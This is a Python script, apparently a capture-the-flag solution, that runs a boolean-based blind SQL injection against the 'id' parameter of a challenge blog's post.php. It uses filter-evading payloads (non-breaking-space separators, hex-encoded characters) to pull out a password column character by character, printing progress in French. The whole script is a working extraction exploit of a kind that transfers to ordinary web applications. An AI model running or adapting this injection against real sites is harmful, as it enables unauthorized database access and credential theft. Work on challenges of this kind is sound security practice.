#!/usr/bin/env python3

from telnetlib import BINARY
import pwn
import string
import requests

table_name = ""
alphabet = string.printable
url = "https://secureblog.challenge.operation-kernel.fr/v3/post.php"
param = "?id="
seek = True
pwn.log.progress("Can i found it ?")
while seek:
    loop = 0
    for car in alphabet:
        req = f"(4)and(binary({hex(ord(car))})%A0in(substr(password,{len(table_name)+1},1)))"

        x = requests.get(url + param + req)

        if str("morale") in x.text:
            table_name += car
            pwn.warn(
                f"Le caractère {car} est le bon, il est ajouté à data_leak : {table_name}")
            x.close()
            loop += 1
            break
        loop += 1
        x.close()
        if loop == len(string.printable):
            if not table_name:
                pwn.warn("Aucune information n'a été leakée")
                seek = False
            else:
                pwn.success("L'information leakée est : {}".format(table_name))
                seek = False
        else:
            continue
